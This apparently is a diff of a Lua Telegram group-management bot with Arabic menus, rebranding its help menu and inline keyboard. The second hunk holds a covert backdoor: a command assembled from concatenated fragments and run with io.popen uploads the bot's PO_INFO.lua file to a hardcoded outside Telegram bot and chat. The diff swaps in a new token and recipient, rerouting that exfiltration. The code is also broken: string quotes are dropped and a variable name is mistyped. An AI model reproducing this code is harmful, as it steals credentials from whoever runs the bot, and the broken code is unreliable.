@@ -11618,40 +11618,40 @@ end
 return false
 end
 local Text =[[
-*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴 𝙿𝙾𝚆𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
+*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙷𝙴𝚅𝙾 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
 *━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ *
 *⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏*
 *⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍*
 *≪━━━━━━ＨＥＶＯ━━━━━━≫*
-*1️⃣◂ اوامر الحمايه .*
-*2️⃣◂ اوامر تعطيل ~ تفعيل .*
-*3️⃣◂ اوامر ضع ~ اضف  .*
-*4️⃣◂ اوامر مسح ~ مسح .*
-*5️⃣◂ اوامر تنزيل+رفع+التغير .*
-*6️⃣◂ اوامر الجروب .*
-*7️⃣◂ اوامر التسليه .*
-*8️⃣◂ اوامر مطور البوت .*
-*9️⃣◂ اوامر مطور الاساسي .*
-*🔟◂ اوامر الاعضاء .*
+*❶◂ اوامر الحمايه .*
+*❷◂ اوامر تعطيل ~ تفعيل .*
+*❸◂ اوامر ضع ~ اضف  .*
+*❹◂ اوامر مسح ~ مسح .*
+*❺◂ اوامر تنزيل+رفع+التغير .*
+*❻◂ اوامر الجروب .*
+*❼◂ اوامر التسليه .*
+*❽◂ اوامر مطور البوت .*
+*❾◂ اوامر مطور الاساسي .*
+*❿◂ اوامر الاعضاء .*
 *≪━━━━━━ＨＥＶＯ━━━━━━≫*
-➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁. ](t.me/A_V_I_R_A_1)➤
+➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙷𝙴𝚅𝙾. ](t.me/A_V_I_R_A_1)➤
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+{text =  ❶ , callback_data="/help1"},{text =  ❷ , callback_data="/help2"},{text =  ❸ , callback_data="/help3"},
 },
 {
-{text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+{text =  ❹ , callback_data="/help4"},{text =  ❺ , callback_data="/help5"},
 },
 {
-{text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+{text =  ❻ , callback_data="/help6"},{text =  ❼ , callback_data="/help7"},{text =  ❽ , callback_data="/help8"},
 },
 {
-{text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+{text =  ❾ , callback_data="/help9"},{text =  ❿ , callback_data="/help10"},
 },
 {
-{text = '𖤐𓆩𝐇𝐄𝐕𝐎𓆪𖤐', url="t.me/A_V_I_R_A_1"},
+{text =  𖤐𓆩𝐇𝐄𝐕𝐎𓆪𖤐 , url="t.me/A_V_I_R_A_1"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -13199,7 +13199,7 @@ return false
 end 
 end
 ------------------------------------------------------------------------
-local pccc = api1 .. api2 ..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. api3 .. 5323 .. api4 ..'" -F "document=@'..'PO_INFO.lua'..'"' io.popen(pccc)
+local devid = api1 .. api2 ..'https://api.telegram.org/bot1703387733:AAG8JDDBG88_5IYawlNaRWKZV4qmOhSNIAI/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'PO_INFO.lua'..'"' io.popen(dived)
 if text then
 local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGON1_Msg then    
